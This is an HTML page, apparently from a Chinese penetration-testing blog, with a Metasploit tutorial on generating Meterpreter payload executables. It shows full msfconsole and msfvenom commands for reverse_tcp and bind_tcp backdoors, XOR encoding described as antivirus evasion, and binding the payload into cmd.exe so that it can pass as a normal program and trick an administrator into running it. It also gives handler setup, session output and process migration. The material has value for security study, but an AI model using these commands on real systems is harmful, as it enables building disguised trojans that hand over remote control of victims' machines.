@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<!--Copyright©QingSword.COM︻☼1010D>-->
+<!--Copyright©X.QingSword.COM︻☼1010D>-->
+<html lang="zh-cn">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0,minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
+	<meta name="keywords" content="晴刃,晴,qing,qingsword,ccna图文笔记,ubuntu,linux,ubuntu server,mysql,python,计算机技术博客,渗透测试,kali渗透测试,kali,kali web渗透,kali主机渗透,kali无线渗透,metasploit,白帽子测试">
+	<meta name="keywords" content="晴刃,晴,qing,qingsword,ccna图文笔记,ubuntu,linux,ubuntu server,mysql,node.js,javascript,python,计算机技术博客">
+	<meta name="author" content="x.qingsword.com">
+	<title>[Metasploit]-8-Payload的生成与绑定 - X.QingSword.COM</title>
+	<link rel="shortcut icon" type="image/x-icon" href="../logo/favicon.ico">
+	<link rel="stylesheet" type="text/css" href="../css/basic.css">
+	<link rel="stylesheet" type="text/css" href="../css/text.css">
+	<!-- 代码块高亮js -->
+	<link type="text/css" rel="stylesheet" href="../plugins/SyntaxHighlighter/styles/shCore.css"/>
+	<link type="text/css" rel="stylesheet" href="../plugins/SyntaxHighlighter/styles/shThemeRDark.css"/>
+	<script type="text/javascript" src="../plugins/SyntaxHighlighter/scripts/shCore.js"></script>
+	<script type="text/javascript" src="../plugins/SyntaxHighlighter/scripts/shBrushBash.js"></script>
+	<script type="text/javascript">
+	SyntaxHighlighter.all();
+	</script>
+</head>
+<body>
+	<!--header -->
+	<header id="nav">
+			<div class="nav-container"> 
+				<!-- 根大纲-->
+				<a href="http://x.qingsword.com" title="晴刃">
+					<h1 class="nav-logo">晴刃</h1>
+				</a>
+				<h2 class="nav-site-description desc-hidden">
+					He lies somewhere here
+				</h2>
+				<nav class="nav-links"> 
+					<!-- nav连接大纲-->
+					<h1 style="display:none;">网站导航</h1> 
+					<ul>
+						<li  class="active li-hidden">
+							<a href="../index.html" title="home">
+								<span class="link-word"><img src="../logo/home.png" alt="home" class="link-img">首页</span>
+							</a>
+						</li>
+						<li class="li-hidden">
+							<a href="../pt.html" title="pt">
+								<span class="link-word"><img src="../logo/linux.png" alt="pt" class="link-img">渗透<span class="word-hidden">技术</span></span>
+							</a>
+						</li>
+						<li >
+							<a href="../sitemap.html" title="sitemap">
+								<span class="link-word"><img src="../logo/archives.png" alt="archives" class="link-img"><span class="word-hidden">文章</span>归档</span>
+							</a>
+						</li>
+					</ul>
+				</nav>
+			</div>		
+	</header>
+	<!-- /header -->
+
+	<!-- content-->
+	<div id="content">
+		<div class="content-container">
+			<!-- 文章区 -->
+			<article class="text-container">
+				<header class="text-header">
+					<h1>[Metasploit]-8-Payload的生成与绑定</h1>	
+				</header><!-- /header -->
+				<section class="text-body">
+					<h2>引言</h2>
+					<p>这篇文章围绕一个实例来讲解如何利用Metasploit生成Payload后门程序。</p>
+					<!-- 目录 -->
+					<h2>文章目录</h2>
+					<ul class="contents">	
+						 <li><a href="#Metasploit-Payload-Backdoor-1">0×1.如何生成Payload可执行文件</a></li>
+						 <li><a href="#Metasploit-Payload-Backdoor-2">0×2.如何将Payload绑定到应用程序</a></li>
+					 </ul>
+					<!-- /目录 -->
+
+					<!-- 正文 -->
+					
+					<h2 id="Metasploit-Payload-Backdoor-1">0×1.如何生成Payload可执行文件</h2>
+
+					<p>前面的几篇文章，介绍了如何通过Exploit调用系统漏洞，从而获得目标系统部分内存覆盖权限，利用这个权限，写入一个Payload，这样写入的Payload完全在目标系统内存执行，没有文件实体，所以极具隐蔽性，而有些时候，我们没有办法利用目标系统漏洞释放Payload，但可以生成一个Payload可执行文件，伪装成正常文件诱导目标机器管理员点击这个Payload，从而返回一个ShellCode给攻击主机。</p>
+
+					<p>实验环境如下：</p>
+					<p class="indent-p">
+						×攻击主机 Kali 192.168.80.158 <br>
+						×目标靶机 Windows2008 x64 192.168.80.139
+					</p>
+
+					<p>1.在Kali中使用msf控制台生成payload可执行程序，请看下面的实例：</p>
+					<pre class="brush: bash;">
+					#打开msf控制台
+					root@qingsword.com:~# msfdb run
+
+					#加载反弹Payload（因为靶机是x64位，所以使用64位的Payload）
+					msf &gt; use payload/windows/x64/meterpreter/reverse_tcp
+
+					#设置Payload参数，lhost设置成攻击者的IP地址，lport端口要与攻击主机监听的端口一致，这样配置后，当目标主机执行这个Payload，就会主动连接192.168.80.158的9999端口
+					msf payload(windows/x64/meterpreter/reverse_tcp) &gt; set lport 9999
+					lport =&gt; 9999
+					msf payload(windows/x64/meterpreter/reverse_tcp) &gt; set lhost 192.168.80.158
+
+					#生成Payload可执行程序
+					# -b 过滤Payload中的无用字节，本例过滤'\x00'
+					# -i 使用-e指定模块反复编码次数，本例是3次
+					# -e 指定用于编码Payload的模块（这些模块主要用于免杀处理，本例因为Payload是x64位，所以需要用x64位的编码方式）
+					# -t 输出的文件类型，本例是windows下的exe可执行文件
+					# -f 文件输出位置，本例输出到/root目录下，文件名为qingsword.exe
+					msf payload(windows/x64/meterpreter/reverse_tcp) &gt; generate -b '\x00' -i 3 -e x64/xor -t exe -f /root/qingsword.exe
+					#如果无报错，看到下面类似的输出，说明Payload生成成功
+					[*] Writing 7168 bytes to /root/qingsword.exe
+
+					#Payload可执行程序准备好后，在Kali上，需要先打开一个Exploit加载相同的Payload（上面生成的是什么Payload，攻击端就加载什么Payload）去监听对应端口
+
+					#使用一个空Exploit，这个Exploit不具备任何攻击功能，但它可以set一个Payload，执行这个Exploit，就能够在本地监听对应端口，等待靶机主动连接
+					msf &gt; use exploit/multi/handler 
+
+					#set的payload需要和前面生成payload可执行程序所使用的payload一致
+					msf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
+					payload =&gt; windows/x64/meterpreter/reverse_tcp
+					msf exploit(multi/handler) &gt; set lhost 192.168.80.158
+					lhost =&gt; 192.168.80.158
+					msf exploit(multi/handler) &gt; set lport 9999
+					lport =&gt; 9999
+
+					#执行这个Exploit，将在本地打开9999端口，等待靶机主动连接
+					msf exploit(multi/handler) &gt; exploit 
+					[*] Started reverse TCP handler on 192.168.80.158:9999
+
+					#然后将生成的qingsword.exe传到Windows2008系统中，双击执行，Kali主机监听的终端会立刻返回一个Meterpreter ShellCode
+					</pre>
+
+					<p>2.使用msfvenom生成Payload可执行程序，请看下面的实例：</p>
+					<pre class="brush: bash;">
+					#msfvenom方式生成Payload，不需要进入msf控制台
+					# --platform 系统平台，可以使用"msfvenom --list platform"命令来查看所有支持的平台
+					# -p 使用哪个Payload
+					# lhost，lport 两个参数为Payload中所需要配置的参数，攻击主机IP与监听端口
+					# -b 清除Payload中的无效字节
+					# -e 指定编码模块
+					# -i 反复编码次数
+					# -f 格式化，本例将Payload格式化成exe可执行文件
+					# -o 文件输出名
+					root@qingsword.com:~# msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=192.168.80.158 lport=9999 -b "\x00" -e x64/xor -i 3 -f exe -o qingsword.com.exe
+
+					#然后同第一部分一样，在攻击主机监听9999端口
+					msf &gt; use exploit/multi/handler 
+					msf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
+					payload =&gt; windows/x64/meterpreter/reverse_tcp
+					msf exploit(multi/handler) &gt; set lhost 192.168.80.158
+					lhost =&gt; 192.168.80.158
+					msf exploit(multi/handler) &gt; set lport 9999
+					lport =&gt; 9999
+					msf exploit(multi/handler) &gt; exploit
+
+					#然后将生成的qingsword.com.exe传到Windows2008系统中，双击执行，Kali主机监听的终端会立刻返回一个Meterpreter ShellCode
+					</pre>
+
+					<h2 id="Metasploit-Payload-Backdoor-2">0×2.如何将Payload绑定到应用程序</h2>
+					
+					<p>在第一部分的实验中，我们使用的是Meterpreter的reverse_tcp这个Payload，这种反弹Payload有一个苛刻的条件，攻击主机的IP地址必须能够被靶机直接访问到，如果攻击者是一台内网机器，反弹Payload就会受限，所以，笔者在第二部分打算使用另外一种类型的Payload来演示，这种Payload叫做Bind_TCP，说白了，一旦执行了Bind_TCP这种类型的Payload，就会在靶机上开放一个端口（这个端口是我们在Bind_TCP中设置的），这个端口一直处于监听状态，等待我们主动去连接它。</p>
+
+					<p>实验环境如下：</p>
+					<p class="indent-p">
+						×攻击主机 Kali 192.168.80.158 <br>
+						×目标靶机 Windows2008 x64 192.168.80.139
+					</p>
+
+					<p>1.使用msf，将Payload绑定到程序cmd.exe上，请看下面的实例：</p>
+					<pre class="brush: bash;">
+					#首先，我们可以选择一个Windows比较常用的程序作为绑定程序，这个程序一旦运行，就会执行Payload，本文使用windows下面的cmd.exe来演示，使用x64位的meterpreter  bind_tcp作为payload，绑定到cmd.exe程序上
+
+					#启动msf，因为目标是x64位windows操作系统，所以这里使用64位的meterpreter
+					msf &gt; use payload/windows/x64/meterpreter/bind_tcp
+
+					#设置参数，仅需设置开放的端口即可
+					msf payload(windows/x64/meterpreter/bind_tcp) &gt; set lport 7777
+					lport =&gt; 7777
+
+					#生成绑定cmd.exe的可执行文件
+					# -b 去除Payload中的无效字节
+					# -k Payload被触发后，不新建进程，依附在宿主进程中执行
+					# -t 输出程序类型，exe可执行文件
+					# -e Payload编码模块，本文使用x64位的xor编码Payload
+					# -i 编码次数，本例为2次
+					# -x 要绑定的程序
+					# -f 最终输出的文件
+					msf payload(windows/x64/meterpreter/bind_tcp) &gt; generate -b '\x00' -k -t exe -e x64/xor -i 2 -x /root/cmd.exe -f /root/qingsword.cmd.exe
+
+					#生成可执行文件成功，输出如下，将"qingsword.cmd.exe"传到Windows2008上执行，会打开一个cmd窗口，此时Payload已经被执行，会在靶机上监听一个TCP 7777端口，等待连接（注意！这种连接方式，必须关闭Windows2008的系统防火墙，或者将7777放到防火墙的入站连接允许列表中，否则会连接失败）
+					[*] Writing 386560 bytes to /root/qingsword.cmd.exe
+
+					#在kali上连接靶机，使用一个空Exploit
+					msf &gt; use exploit/multi/handler 
+
+					#加载的Payload需要和刚才生成Payload时使用的一样
+					msf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/bind_tcp
+					payload =&gt; windows/x64/meterpreter/bind_tcp
+
+					#设置成靶机上监听的端口
+					msf exploit(multi/handler) &gt; set lport 7777
+					lport =&gt; 7777
+
+					#设置靶机的IP地址
+					msf exploit(multi/handler) &gt; set rhost 192.168.80.139
+					rhost =&gt; 192.168.80.139
+
+					#执行，然后就会看到返回了一个Meterpreter ShellCode
+					msf exploit(multi/handler) &gt; exploit 
+
+					#成功连接
+					[*] Meterpreter session 1 opened (192.168.80.158:38203 -> 192.168.80.139:7777) at 2018-09-16 11:22:05 +0800
+
+					#注意，如果靶机上绑定Payload的那个cmd.exe程序被关闭，连接也会断开，可以在获得这个Shell后，马上将进程迁移到其他程序上，保持程序稳定性，ps查看系统进程PID，然后使用migrate将Payload迁移到1852进程上
+					meterpreter &gt; ps 
+					1852  436   conhost.exe  x64  1  WIN-9PV48KN2GGU\Administrator
+					meterpreter &gt; migrate 1852
+
+					#这种进程迁移很可能不会成功，迁移过程中，原本的cmd.exe进程就会关闭，所以如果迁移进程失败，原本的连接也会丢失
+					</pre>
+
+					<p>2.使用msfvenom，将Payload绑定到程序cmd.exe上，请看下面的实例：</p>
+					<pre class="brush: bash;">
+					#使用msfvenom生成绑定Payload的可执行文件，效果同上
+					# --platform 指定目标系统平台
+					# -p 设置使用的Payload
+					# lport 因为使用的是bind_tcp，所以只需要配置监听端口
+					# -k Payload被触发后，不新建进程，依附在宿主进程中执行
+					# -f 程序输出类型，本例为exe可执行文件
+					# -e 编码方式
+					# -i 编码次数
+					# -x 用于绑定的可执行文件
+					# -o 最终输出的可执行文件
+					root@qingsword.com:~# msfvenom --platform windows -p windows/x64/meterpreter/bind_tcp lport=7777 -k -f exe -e x64/xor -i 2 -x /root/cmd.exe -o /root/qingsword.cmd.exe
+
+					#将这个可执行文件传到靶机上执行，在Kali上使用空Exploit连接方法同"使用msf"的第一部分，这里不再赘述
+					</pre>
+					
+					<p>文章配套小视频[<a title="qingsword制作Metasploit Payload的生成与绑定小视频" href="https://pan.baidu.com/s/1sVdwB985YjD5xsM86M-CLw" target="_blank" rel="nofollow">点击这里</a>][提取码 dh62]，下载观看。</p>
+					
+					<!-- /正文 -->
+
+
+				<footer class="text-footer">
+					<p>
+						*转载请注明来自:<a title="晴刃-自由、互助、分享、专注计算机技术。" href="http://x.qingsword.com" target="_blank">晴刃(X.QingSword.COM)</a>
+					</p>
+					<p>*原文连接:<a title="[Metasploit]-8-Payload的生成与绑定" href="https://x.qingsword.com/qing/Metasploit-8.html" target="_blank">https://x.qingsword.com/qing/Metasploit-8.html</a></p>
+				</footer>
+			</article>
+			<!-- /文章区 -->	
+		</div>
+	</div>
+	<!-- /content -->
+	
+	<!-- footer -->
+	<footer id="footer">
+		<div class="footer-container">
+			QingSword.COM &nbsp;<img src="../logo/by-nc-sa.png" alt="Creative Commons" title="Creative Commons">
+		</div>
+	</footer>
+	<!-- /footer -->
+</body>
+</html>
